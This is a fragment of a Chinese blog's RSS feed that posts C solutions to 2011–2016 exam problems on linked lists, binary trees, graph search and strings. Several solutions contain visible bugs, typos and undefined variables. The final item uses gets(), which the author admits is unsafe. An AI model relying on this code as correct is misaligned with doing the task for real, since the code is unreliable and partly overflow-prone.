int main() { //数组下标从1开始  int arr[maxSize]; int temp,n=0,flag=1; while(flag==1) { scanf(&amp;#34;%d&amp;#34;,&amp;amp;temp); if(temp!</description>
    </item>
    
    <item>
      <title>2011-d-二-2</title>
      <link>/post/2011-d-%E4%BA%8C-2/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-d-%E4%BA%8C-2/</guid>
      <description>//采用指针游历的方式求层数遍历 int l; int num=0; int leno(BTNode *p,int x) { if(p!=NULL) { if((l==x||l==x+1)&amp;amp;&amp;amp;p-&amp;gt;lchild==NULL&amp;amp;&amp;amp;p-&amp;gt;rchild==NULL) ++num; ++l; leno(p-&amp;gt;lchild,x); leno(p-&amp;gt;rchild,x); --l; } return num; } </description>
    </item>
    
    <item>
      <title>2011-d-二-3</title>
      <link>/post/2011-d-%E4%BA%8C-3/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-d-%E4%BA%8C-3/</guid>
      <description> 同2016-d-二-3
 int fun(LNode *l) { int max,min; LNode *p; p=l; max=p-&amp;gt;data; min=p-&amp;gt;data; //先找出最大值最小值  while(p!=NULL) { if(p-&amp;gt;data&amp;gt;max) max=p-&amp;gt;data; if(p-&amp;gt;data&amp;lt;min) min=p-&amp;gt;data; p=p-&amp;gt;next; } //判断是否符合要求  while(p-&amp;gt;next-&amp;gt;next!=NULL&amp;amp;&amp;amp;p-&amp;gt;data==p-&amp;gt;next-&amp;gt;data+p-&amp;gt;next-next-&amp;gt;data) { p=p-&amp;gt;next; } //判断退出循环时p-&amp;gt;next-&amp;gt;next的值是否为空，不为空证明提前跳出循环  if(p-&amp;gt;next-&amp;gt;next-&amp;gt;data==NULL) { printf(&amp;#34;%d&amp;#34;,max); return 1; }else{ printf(&amp;#34;%d&amp;#34;,min); return 0; } } </description>
    </item>
    
    <item>
      <title>2013-d-二-1</title>
      <link>/post/2013-d-%E4%BA%8C-1/</link>
      <pubDate>Fri, 28 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-d-%E4%BA%8C-1/</guid>
      <description>/** 分为三种情况： 1.链表长度&amp;lt;i:不进行任何操作 2.i+len&amp;gt;链表长度&amp;gt;i:在i处将链表断开 3.链表长度&amp;gt;i,链表长度&amp;gt;i+len：删除后重新连接链表 i的位置分为两种情况： i=1,从首结点开始删除：需考虑l指针修改问题 i不等于1，从中间节点删除：无需考虑 **/ #include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;typedef struct LNode { int data; struct LNode *next; }LNode; //查找指定位置指针 LNode* FindPos(LNode *l,int x) { LNode *p; p=l; int n=1; while(p-&amp;gt;next!=NULL) { if(n==x)return p; p=p-&amp;gt;next; ++n; } return NULL; } //删除操作 LNode* DelFun(LNode *l,int i,int len) { LNode *p,*n,*m; p=l; int count=0; //统计链表长度  while(p!=NULL) { ++count; p=p-&amp;gt;next; } //判断链表是否为空  if(count&amp;gt;0) { if(i&amp;gt;1)//不从首结点开始删  { if(count&amp;gt;i&amp;amp;&amp;amp;count&amp;lt;i+len) { n=FindPos(l,i-1); n-&amp;gt;next=NULL; } if(count&amp;gt;i&amp;amp;&amp;amp;count&amp;gt;i+len) { n=FindPos(l,i-1); m=FindPos(l,i+len); n-&amp;gt;next=m; } }else{ //从头结点开始删  if(count&amp;lt;=len) l=NULL; if(count&amp;gt;len) { n=FindPos(l,i+len); l=n; } } } return l; } /**用于测试 //创建链表 LNode* create() { LNode *c,*s,*r; c=(LNode*)malloc(sizeof(LNode)); c-&amp;gt;next=NULL; c-&amp;gt;data=1; r=c; int i; for(i=2;i&amp;lt;=20;++i) { s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=i; r-&amp;gt;next=s; r=r-&amp;gt;next; } return c; } //打印链表 void printL(LNode *l) { LNode *p; p=l; while(p!</description>
    </item>
    
    <item>
      <title>2013-d-二-2</title>
      <link>/post/2013-d-%E4%BA%8C-2/</link>
      <pubDate>Fri, 28 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-d-%E4%BA%8C-2/</guid>
      <description>int L=1; void leno(BTNode *p,char x) { if(p!=NULL) { if(p-&amp;gt;data==x) cout&amp;lt;&amp;lt;L&amp;lt;&amp;lt;endl; ++L; leno(p-&amp;gt;lchild,x); leno(p-&amp;gt;rchild,x); --L; } } </description>
    </item>
    
    <item>
      <title>2013-d-二-3</title>
      <link>/post/2013-d-%E4%BA%8C-3/</link>
      <pubDate>Fri, 28 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-d-%E4%BA%8C-3/</guid>
      <description>/** 算法思想：从一个顶点采用深度优先搜索遍历， 如果能访问到所有结点则该顶点为根。 **/ #define maxSize 100 int visit[maxSize];//标记访问数组 int num=0;//用于统计访问过的节点数  void SearchRoot(AGraph *G) { int i; for(i=0;i&amp;lt;G-&amp;gt;n;++i) visit[i]=0;//设置未访问  for(i=0;i&amp;lt;G-&amp;gt;n;++i) { DFS(G,i); if(num==G-&amp;gt;n) printf(&amp;#34;%c&amp;#34;,G-&amp;gt;adjlist[i].data); for(i=0;i&amp;lt;G-&amp;gt;n;++i) visit[i]=0;//设置未访问  num=0; } } void DFS(AGraph G,int v) { ArcNode *p; visit[v]=1; ++num;//用于记录访问过顶点的数量  p=adjlist[v].firstarc; while(p!=NULL) { if(visit[p-&amp;gt;adjvex]==0) DFS(G,p-&amp;gt;adjvex); p=p-&amp;gt;nextarc; } } </description>
    </item>
    
    <item>
      <title>2013-c-二-1</title>
      <link>/post/2013-c-%E4%BA%8C-1/</link>
      <pubDate>Tue, 25 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-c-%E4%BA%8C-1/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; int longf(int n,int m) { if(m==0||m&amp;gt;n) return 0; else if(m==1||m==n) return 1; else if (n&amp;gt;m&amp;amp;&amp;amp;m&amp;gt;0) return m+longf(n-1,m)-longf(n-1,m-1); } int main() { int n,m,r; printf(&amp;#34;请输入m与n的值：&amp;#34;); scanf(&amp;#34;%d,%d&amp;#34;,&amp;amp;m,&amp;amp;n); printf(&amp;#34;%d&amp;#34;,longf(m,n)); } </description>
    </item>
    
    <item>
      <title>2013-c-二-2</title>
      <link>/post/2013-c-%E4%BA%8C-2/</link>
      <pubDate>Tue, 25 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-c-%E4%BA%8C-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#define N 3 //返回值1：满足，0：不满足 //注意二维数组必须指定列数 int fun(int a[][N]) { int i,j,s,k; int *p=a; //判断是否有重复数字  for(i=0;i&amp;lt;N*N;i++) { for(j=i+1;j&amp;lt;N*N;j++) if(*(p+i)==*(p+j))return 0; } //判断对角线  s=a[0][0]+a[1][1]+a[2][2]; k=a[2][0]+a[1][1]+a[0][2]; if(s!=k) return 0; //判断行是否满足  for(i=0;i&amp;lt;N;i++) { k=0; for(j=0;j&amp;lt;N;j++) k=k+a[i][j]; if(k!=s) return 0; } //判断列是否满足  for(j=0;j&amp;lt;N;j++) { k=0; for(i=0;i&amp;lt;N;i++) k=k+a[i][j]; if(k!=s) return 0; } return 1; } //用于测试 int main() { int a[3][3]; a[0][0]=2; a[0][1]=9; a[0][2]=4; a[1][0]=7; a[1][1]=5; a[1][2]=3; a[2][0]=6; a[2][1]=1; a[2][2]=8; printf(&amp;#34;%d&amp;#34;,fun(a)); } </description>
    </item>
    
    <item>
      <title>2013-c-二-3</title>
      <link>/post/2013-c-%E4%BA%8C-3/</link>
      <pubDate>Tue, 25 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2013-c-%E4%BA%8C-3/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; int main() { char str[50][32];//用于存储从文件中读取的单词  char temp[32];//用于临时存储变量  FILE *in,*out; int i,j,n=0; //判断打开文件是否成功  if((in=fopen(&amp;#34;.\\file.txt&amp;#34;,&amp;#34;r&amp;#34;))==NULL)//文件当前路径  { printf(&amp;#34;open error&amp;#34;); exit(-1);//需要 stdlib.h  } //读取文件  while(fscanf(in,&amp;#34;%s &amp;#34;,str[n])!=EOF) n++; //关闭文件  fclose(in); //对单词进行排序，采用冒泡法  for(i=0;i&amp;lt;n;i++) { for(j=0;j&amp;lt;n;j++) { if(strcmp(str[j],str[j+1])&amp;gt;0) { strcpy(temp,str[j+1]); strcpy(str[j+1],str[j]); strcpy(str[j],temp); } } } //输出文件  //判断打开文件是否成功  if((out=fopen(&amp;#34;.\\file2.txt&amp;#34;,&amp;#34;w&amp;#34;))==NULL) { printf(&amp;#34;open error&amp;#34;); exit(-1);//需要 stdlib.h  } for(i=0;i&amp;lt;n;i++) fprintf(out,&amp;#34;%s &amp;#34;,str[i]); fclose(out); } </description>
    </item>
    
    <item>
      <title>2014-d-二-1</title>
      <link>/post/2014-d-%E4%BA%8C-1/</link>
      <pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-d-%E4%BA%8C-1/</guid>
      <description>//本题要求时间最小，辅助空间最小，改自快排 void fun(int a[],int n) { int i=0,j=n-1;//首尾坐标  while(a[i]&amp;lt;0)++i;//找到首个待移动位置  while(a[j]&amp;gt;0)--j;//最后一个待移动位置  temp=a[i]; while(i!=j) { while(j&amp;gt;i&amp;amp;&amp;amp;a[j]&amp;gt;0)--j;//找比0小的位置  if(i&amp;lt;j) { a[i]=a[j]; ++i; } while(i&amp;lt;j&amp;amp;&amp;amp;a[i]&amp;lt;0)++i; if(i&amp;lt;j) { a[j]=a[i]; --j; } } a[i]=temp; } //其他算法，非最优 #include &amp;lt;iostream&amp;gt;#include &amp;lt;stdlib.h&amp;gt; using namespace std; typedef struct Link { int data; struct Link *next; }Link; /** 算法思想： 1.从头至尾扫描链表，找到第一个大于0的结点M 2.继续扫描将小于0的结点插入到M前 **/ void sort(Link *&amp;amp;L) { Link *p,*q,*r,*pre; p=L-&amp;gt;next;//带头结点  pre=L; //找到第一个正数  while(p) { if(p-&amp;gt;data&amp;gt;0) break; pre=p;//记录前驱结点  p=p-&amp;gt;next; } q=pre;//保留M的先前结点  while(p) { if(p-&amp;gt;data&amp;lt;0) { r=p; pre-&amp;gt;next=p-&amp;gt;next;//删除结点  p=p-&amp;gt;next; r-&amp;gt;next=q-&amp;gt;next;//将该结点插入到M前  q-&amp;gt;next=r; }else{ pre=p; p=p-&amp;gt;next; } } } /** //用于测试 //打印链表 void print_link(Link *l) { Link *p; p=l-&amp;gt;next; while(p) { cout&amp;lt;&amp;lt;p-&amp;gt;data&amp;lt;&amp;lt;endl; p=p-&amp;gt;next; } } int main() { //建立单链表 Link *l,*s,*r; l=(Link *)malloc(sizeof(Link)); l-&amp;gt;next=NULL; r=l; s=(Link*)malloc(sizeof(Link)); s-&amp;gt;data=-1; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=s; s=(Link*)malloc(sizeof(Link)); s-&amp;gt;data=1; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=s; s=(Link*)malloc(sizeof(Link)); s-&amp;gt;data=-1; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=s; s=(Link*)malloc(sizeof(Link)); s-&amp;gt;data=-5; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=s; sort(l); print_link(l); } **/ </description>
    </item>
    
    <item>
      <title>2014-d-二-2</title>
      <link>/post/2014-d-%E4%BA%8C-2/</link>
      <pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-d-%E4%BA%8C-2/</guid>
      <description>//获取树高度 int getDepth(BTNode *p) { int ld,rd; if(p-&amp;gt;lchild==NULL&amp;amp;&amp;amp;p-&amp;gt;rchild==NULL) return 0; else{ ld=getDepth(p-&amp;gt;lchild); rd=getDepth(p-&amp;gt;rchild); return ld&amp;gt;rd?ld＋1:rd＋1; } } //找结点获取高度 int get(BTNode *p,int x) { if(p!=NULL) { if(p-&amp;gt;data==x) return getPath(p); else{ get(p-&amp;gt;lchild,x); get(q-&amp;gt;rchild,x); } } } </description>
    </item>
    
    <item>
      <title>2014-d-二-3</title>
      <link>/post/2014-d-%E4%BA%8C-3/</link>
      <pubDate>Sun, 23 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-d-%E4%BA%8C-3/</guid>
      <description>// 未确认
int visit[maxSize]; int stack[maxSize]; int j=0; int u,pre;//第二个结点、用于指向出栈前的结点 int len; void dfs(AGraph *G,int v) { ArcNode *p;//边结点  visit[v]=1;//标记访问  stack[++j]=v;//新访问结点入栈  if(v==u)//找到一条联通路径  { if(j-1==len)//判断路径长度是否符合规定  { //输出路径  } visit[v]=0; pre=v; --j;//u顶点先出栈  for(k=j;k&amp;gt;0;k--) { p=G-&amp;gt;adjlist[stack[k]].firstarc; while(p!=NULL) { if(visit[p-&amp;gt;adjvex]==0&amp;amp;&amp;amp;p-adjvex!=pre) { dfs(G,p-&amp;gt;adjvex); } p=p-&amp;gt;next; } } } p=G-&amp;gt;adjlist[v].firstarc; while(p!=NULL) { if(visit[p-&amp;gt;adjvex]==0) { dfs(G,p-&amp;gt;adjvex); } p=p-&amp;gt;next; } } </description>
    </item>
    
    <item>
      <title>2014-c-三-1</title>
      <link>/post/2014-c-%E4%B8%89-1/</link>
      <pubDate>Thu, 20 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-c-%E4%B8%89-1/</guid>
      <description>int main() { int i=1; while(((i%5==1)&amp;amp;&amp;amp;(i%6==5)&amp;amp;&amp;amp;(i%7==4)&amp;amp;&amp;amp;(i%11==10))==0) { i++; } printf(&amp;#34;i=%d&amp;#34;,i); } </description>
    </item>
    
    <item>
      <title>2014-c-三-2</title>
      <link>/post/2014-c-%E4%B8%89-2/</link>
      <pubDate>Thu, 20 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-c-%E4%B8%89-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#define maxSize 100 int main() { char str[maxSize];//字符串  char *p;//字符指针  int b=0,s=0;//定义大小写数量  p=str; scanf(&amp;#34;%s&amp;#34;,str); //统计个数注意等号  while(*p!=&amp;#39;\0&amp;#39;) { if(*p&amp;gt;=&amp;#39;A&amp;#39;&amp;amp;&amp;amp;*p&amp;lt;=&amp;#39;Z&amp;#39;) ++b; if(*p&amp;gt;=&amp;#39;a&amp;#39;&amp;amp;&amp;amp;*p&amp;lt;=&amp;#39;z&amp;#39;) ++s; p++; } printf(&amp;#34;小写字符个数%d\n&amp;#34;,s); printf(&amp;#34;大写字符个数%d\n&amp;#34;,b); p--;//此时指针在\0位置，前移一个位置  while(p&amp;gt;=str) { if(*p&amp;gt;=&amp;#39;A&amp;#39;&amp;amp;&amp;amp;*p&amp;lt;=&amp;#39;Z&amp;#39;) { printf(&amp;#34;%c&amp;#34;,*p); } p--; } } </description>
    </item>
    
    <item>
      <title>2014-c-三-3</title>
      <link>/post/2014-c-%E4%B8%89-3/</link>
      <pubDate>Thu, 20 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2014-c-%E4%B8%89-3/</guid>
      <description>//改进算法 void fun(int a[][maxSize],int row,int col) { int i,j,k,min,min_j,flag; for (i=0;i&amp;lt;row;++i) { min=a[i][0]; min_j=0; for (j=0;j&amp;lt;col;++j)//找行最小值 {  if(a[i][j]&amp;lt;min_j) { min=a[i][j]; //记录本行最小值  min_j=j; //记录最小数列标  } } flag=1; //判断最小数在列上是否为最大值  for (k=0;k&amp;lt;row;++k) { if(min&amp;lt;a[k][min_j])//如果有一个数比行最小值大证明不是鞍点 {  flag=0; break; } } if(flag) { printf(&amp;#34;鞍点坐标：%d,%d且值为：&amp;#34;,i,min_j,min); break; } } } //此算法过于复杂,不需要记录最大行坐标数组，改进算法的行最小列最大与此相反，原理相同 #include #include#define maxSize 100 /** 算法思想： 找到每一行的最大值，用数组记录此时最大值坐标 根据坐标循环判断是否为此列的最小值 **/ int main() { //构造数据  int m,n; scanf(&amp;#34;%d,%d&amp;#34;,&amp;amp;m,&amp;amp;n); int p[maxSize][maxSize]; int i,j,k; int h_max[maxSize]; //行最大值数组  for (i=0;i&amp;lt;m;i++) { for (j=0;j&amp;lt;n;j++) { printf(&amp;#34;请输入%d行%d列：\n&amp;#34;,i,j); scanf(&amp;#34;%d&amp;#34;,&amp;amp;p[i][j]); } } for (i=0;i&amp;lt;m;i++) { for (j=0;j&amp;lt;n;j++) printf(&amp;#34;%d\t&amp;#34;,p[i][j]); printf(&amp;#34;\n&amp;#34;); } //查找行最大值元素，将最大值的列坐标记录下来  for (i=0;i&amp;lt;m;i++) { h_max[i]=0; //先取第i行第0列为最大值  for (j=0;j&amp;lt;n;j++) { if(p[i][j]&amp;gt;p[i][h_max[i]]) { h_max[i]=j; //记录行最大值的列坐标  } } printf(&amp;#34;第%d行最大值为第%d列\n&amp;#34;,i, h_max[i]); } //判断行最大值是否为列最小值  for (i=0;i&amp;lt;m;i++) { int t = h_max[i]; int v_min = p[i][t]; int flag; for (k=0;k&amp;lt;m;k++) { if(p[k][t]&amp;gt;=v_min)//注意要有等号！！！  flag=1; else { flag=0; break; //不是最小值立即跳出循环  } } if(flag==1) printf(&amp;#34;满足条件的是%d行%d列元素，值为%d\n&amp;#34;,i,t,v_min); } } </description>
    </item>
    
    <item>
      <title>2015-d-二-1</title>
      <link>/post/2015-d-%E4%BA%8C-1/</link>
      <pubDate>Tue, 18 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-d-%E4%BA%8C-1/</guid>
      <description>/** 算法思想：如果有序有两种情况1.递增2.递减,注意有相邻相等情况 从前之后两两比较相邻节点差值 **/ #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;//链表结构体 typedef struct lNode { int data; struct LNode *next; }LNode; // 返回值0：无序 1：有序 // init 、flag 0：两个值相等 1：递增 -1：递减 int isOrder(LNode *l) { LNode *p,*q; int flag,init;//init为第一个结点标记 flag为循环中标记  p=l;//p指向开始结点  q=p-&amp;gt;next;//q指向p的下一个结点  while(p-&amp;gt;data==q-&amp;gt;data&amp;amp;&amp;amp;q-&amp;gt;next!=NULL)//恰好两个比较的值相等  { p=p-&amp;gt;next; q=p-&amp;gt;next; } if(p-&amp;gt;data&amp;gt;q-&amp;gt;data) init=-1;//递减  else if (p-&amp;gt;data&amp;lt;q-&amp;gt;data) init=1;//递增  else { init=0;//从头至尾都相等  return 1; } while(q) { if(p-&amp;gt;data&amp;gt;q-&amp;gt;data) flag=-1;//递减  else if (p-&amp;gt;data&amp;lt;q-&amp;gt;data) flag=1;//递增  else flag=0;//说明此时链表中元素均相等  if(flag+init==0) return 0;//无序  p=p-&amp;gt;next; q=q-&amp;gt;next; } return 1; } //链表建立,测试数据 LNode* create() { LNode *c,*s,*r; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=6; r=s; c=s; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=6; r-&amp;gt;next=s; r=r-&amp;gt;next; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=5; r-&amp;gt;next=s; r=r-&amp;gt;next; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=4; r-&amp;gt;next=s; r=r-&amp;gt;next; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=1; r-&amp;gt;next=s; r=r-&amp;gt;next; s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;next=NULL; s-&amp;gt;data=1; r-&amp;gt;next=s; r=r-&amp;gt;next; return c; } int main() { LNode *l = create();; printf(&amp;#34;%d&amp;#34;,isOrder(l)); } </description>
    </item>
    
    <item>
      <title>2015-d-二-2</title>
      <link>/post/2015-d-%E4%BA%8C-2/</link>
      <pubDate>Tue, 18 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-d-%E4%BA%8C-2/</guid>
      <description>//天勤p141原题 typedef struct { BTNode *p; int lno; }st; int maxNode(BTNode *b) { //新队列初始化  st que[maxSize]; int front,rear; front=rear=0; //辅助变量  int lno,i,j,n=0,max=0; BTNode *q; if(b!=NULL) { ++rear; que[rear].p=b; que[rear].lno=1; while(front!=rear) { ++front; q=que[front].p; lno=que[front].lno; if(q-&amp;gt;lchild!=NULL) { ++rear; que[rear].p=q-&amp;gt;lchild; que[rear].lno=lno+1; } if(q-&amp;gt;rchild!=NULL) { ++rear; que[rear].p=q-&amp;gt;rchild; que[rear].lno=lno+1; } } for(i=1;i&amp;lt;=lno;i++) { for(j=1;j&amp;lt;=rear;++j) if(que[j].lno==i) ++n; if(max&amp;lt;n) max=n; } return max; } return 0; } </description>
    </item>
    
    <item>
      <title>2015-d-二-3</title>
      <link>/post/2015-d-%E4%BA%8C-3/</link>
      <pubDate>Tue, 18 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-d-%E4%BA%8C-3/</guid>
      <description>/** 算法思想： 采用迪杰斯特拉算法，找出v0到其余各个节点的最小路径。 遍历输出最小路径为k的节点 **/ // 邻接矩阵 typedef struct Graph { char vexs[MAX];	// 顶点集合 	int vexnum;	// 顶点数 	int edgnum;	// 边数 	int matrix[MAX][MAX]; // 邻接矩阵 }Graph; /* * 参数说明： *	G -- 图 *	vs -- 起始顶点(start vertex)。即计算&amp;#34;顶点vs&amp;#34;到其它顶点的最短路径。 *	prev -- 前驱顶点数组。即，prev[i]的值是&amp;#34;顶点vs&amp;#34;到&amp;#34;顶点i&amp;#34;的最短路径所经历的全部顶点中，位于&amp;#34;顶点i&amp;#34;之前的那个顶点。 *	dist -- 长度数组。即，dist[i]是&amp;#34;顶点vs&amp;#34;到&amp;#34;顶点i&amp;#34;的最短路径的长度。 */ void dijkstra(Graph G, int vs, int prev[], int dist[]) { int i,j,k; int min; int tmp; int flag[MAX];	// flag[i]=1表示&amp;#34;顶点vs&amp;#34;到&amp;#34;顶点i&amp;#34;的最短路径已成功获取。  // 初始化 	for (i = 0; i &amp;lt; G.</description>
    </item>
    
    <item>
      <title>2015-c-二-1</title>
      <link>/post/2015-c-%E4%BA%8C-1/</link>
      <pubDate>Mon, 17 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-c-%E4%BA%8C-1/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;//功能函数 int total(int n) { if(n==1) return 1; else{ return total(n-1)+n+1; } } //主函数 int main() { int n; scanf(&amp;#34;%d&amp;#34;,&amp;amp;n); printf(&amp;#34;%d&amp;#34;,total(n)); } </description>
    </item>
    
    <item>
      <title>2015-c-二-2</title>
      <link>/post/2015-c-%E4%BA%8C-2/</link>
      <pubDate>Mon, 17 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-c-%E4%BA%8C-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;typedef struct Date { int year; int month; int day; }Date; int calculate(Date d) { int n=0; switch(d.month-1) { case 11:n+=30; case 10:n+=31; case 9:n+=30; case 8:n+=31; case 7:n+=31; case 6:n+=30; case 5:n+=31; case 4:n+=30; case 3:n+=31; case 2:n+=28; case 1:n+=31; } return n; } int main() { int year,month,day,num; Date d; //输入数据  printf(&amp;#34;按格式输入：年,月,日\n&amp;#34;); scanf(&amp;#34;%d,%d,%d&amp;#34;,&amp;amp;year,&amp;amp;month,&amp;amp;day); //向结构体传数据  d.year=year; d.month=month; d.day=day; //计算天数不考虑是否闰年  num = calculate(d)+day; //判断是否是闰年  if((year%4==0&amp;amp;&amp;amp;year%100!=0)||year%400==0) { //判断月份是否大于2  if(month&amp;gt;2) num=num+1; } printf(&amp;#34;%d月%d日是%d年的第%d天\n&amp;#34;,month,day,year,num); } </description>
    </item>
    
    <item>
      <title>2015-c-二-3</title>
      <link>/post/2015-c-%E4%BA%8C-3/</link>
      <pubDate>Mon, 17 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2015-c-%E4%BA%8C-3/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#define maxSize 100 //字符串复制函数 str_copy(char *str,char *kid,int k) { char *p;//原始字符串指针  char *q;//新字符串指针  p=str+k-1;//指向第k个字符  q=kid; while(*p!=&amp;#39;\0&amp;#39;) { *q=*p; q++; p++; } *q=&amp;#39;\0&amp;#39;; } //主函数 int main() { char str[maxSize]; char kid[maxSize]; int k; scanf(&amp;#34;%s&amp;#34;,str); scanf(&amp;#34;%d&amp;#34;,&amp;amp;k); str_copy(str,kid,k);//调用复制函数  printf(&amp;#34;%s\n&amp;#34;,str); printf(&amp;#34;%s\n&amp;#34;,kid); } </description>
    </item>
    
    <item>
      <title>【2016-d-二-2】求二叉树指定结点的层数</title>
      <link>/post/2016-d-%E4%BA%8C-2/</link>
      <pubDate>Sun, 16 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-d-%E4%BA%8C-2/</guid>
      <description>/** 算法思想：由二叉树的遍历特点，指针总是由上层走向下层，一直走到最底层 然后返回上层。设置变量记录层数，当指针走向下层时层数加一 返回上层时，层数减一。如果找到指定结点，输出层数。 **/ int l = 1; void leno (BTNode *p,char x) { if(p!=NULL) { if(p-&amp;gt;data==x) printf(&amp;#34;%d&amp;#34;,l); ++l; leno(p-&amp;gt;lchild,x); leno(p-&amp;gt;rchild,x); --l; } } </description>
    </item>
    
    <item>
      <title>【2016-d-二-3】求无向图联通分量个数，并输出联通分量的顶点集</title>
      <link>/post/2016-d-%E4%BA%8C-3/</link>
      <pubDate>Sun, 16 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-d-%E4%BA%8C-3/</guid>
      <description>/** 算法思想： 从任意一个结点开始，进行深度优先搜索，输出访问过的结点。 连通分量加一，再选取未被访问过的节点进行深度优先搜索。 直到所有结点都被访问完。 **/ #define maxSize 100 int visit[maxSize]; void conCom(AGraph *G) { int i; int count=0; for(i=0;i&amp;lt;G-&amp;gt;n;i++) { if(visit[i]==0) { DFS(G,i); count++; } } printf(&amp;#34;%d&amp;#34;,count); } void DFS(AGraph *G,int v) { ArcNode *p;//边指针  visit[v]=1;//标记访问  printf(&amp;#34;%d&amp;#34;,v); p=G-&amp;gt;adjlist[v].firstarc; while(p!=NULL) { if(visit[p-&amp;gt;adjvex]==0) { DFS(G,p-&amp;gt;adjvex); p=p-&amp;gt;nextarc; } } } </description>
    </item>
    
    <item>
      <title>【2016-d-二-1】双链表结点按照访问的频度递减排序</title>
      <link>/post/2016-d-%E4%BA%8C-1/</link>
      <pubDate>Sat, 15 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-d-%E4%BA%8C-1/</guid>
      <description>/** 算法思想：1.从头至尾遍历双链表，找到data值为x的节点 2.将此节点频度加一，将此节点在链表中删除 3.从右至左找到第一个频度比他大的节点，插入到此节点后面 **/ typedef struct DLNode { int data; int freq; struct DLNode *prior; struct DLNode *next; }DLNode; void locate( DLNode *l,int x) { DLNode *p,*q; p=l-&amp;gt;next;//l即为头结点  while(p!=l) { if(p-&amp;gt;data == x) { q=p;//p指针暂存查找到的这个节点  q-&amp;gt;freq = q-&amp;gt;freq+1;//访问频度加一  //先将q在原位置删除，因为我们要从后往前找到插入点，  //必须先删除，避免他位置不变，重复插入的情况  q-&amp;gt;prior-&amp;gt;next=q-&amp;gt;next; q-&amp;gt;next-&amp;gt;prior=q-&amp;gt;prior; //从这个点开始，向表头方向查找q的插入点  while(p!=l) { if(q-&amp;gt;freq&amp;lt;p-&amp;gt;freq)//从右至左找到第一个比q的频度大的结点  { //将q插入到此位置的后面  q-&amp;gt;next = p-&amp;gt;next; p-&amp;gt;next-&amp;gt;prior=q; p-&amp;gt;next=q; q-&amp;gt;prior=p; } p=p-&amp;gt;prior;//p指针前移  } } p=p-&amp;gt;next; } } </description>
    </item>
    
    <item>
      <title>【2016-c-三-3】找出指定字符在字串中首次出现的位置</title>
      <link>/post/2016-c-%E4%B8%89-3/</link>
      <pubDate>Fri, 07 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2016-c-%E4%B8%89-3/</guid>
      <description>找出指定字符在字串中首次出现的位置
// 在编写这个程序的时候遇到的问题：  /** scanf(&amp;#34;%s&amp;#34;,str); 输入完成时会有一个\n被压栈存储，导致第二个scanf失效 解决方案： 1. scanf(&amp;#34;%s]&amp;#34;,str); fflush(stdin);//清空缓冲区 2. scanf(&amp;#34;%s&amp;#34;,str);//用getchar将\n取出 char test = getchar(); printf(&amp;#34;%d&amp;#34;,test); 3.gets(str);// 串中有空格等： 1.字符串里面可能有空格、制表符等空白字符，如果直接用%s是不可以的 2.gets()可以实现，但是gets不安全，控制难度大。 3.scanf(&amp;#34;%[^\n]%*c&amp;#34;,str); //%*c的作用是读入\n,否则后面读入的将一直是\n 、%*c表示读入不存储注意c不可以换成其他字符 //^表示&amp;#34;非&amp;#34;，即读入其后面的字符就结束读入 **/ // 参考链接： // http://blog.csdn.net/hao5743/article/details/6939661 // http://blog.sina.com.cn/s/blog_60cbc1700100ohil.html // http://blog.csdn.net/why850901938/article/details/51298656  // 本题答案：  #include #define MaxSize 100 int search_pos(char *str,char c) { int i = 1;//用于标记位置 while(*str) { if(*str==c) return i; str++;//指针下移 i++;//标记加一  } return 0; } int main() { char str[MaxSize],x; int pos; printf(&amp;#34;请输入字符串\n&amp;#34;); gets(str);//考试应该可以写 //scanf(&amp;#34;%[^\n]%*c&amp;#34;,str);//%*c表示输入但不存储 标准写法 printf(&amp;#34;请输入要查找的字符\n&amp;#34;); 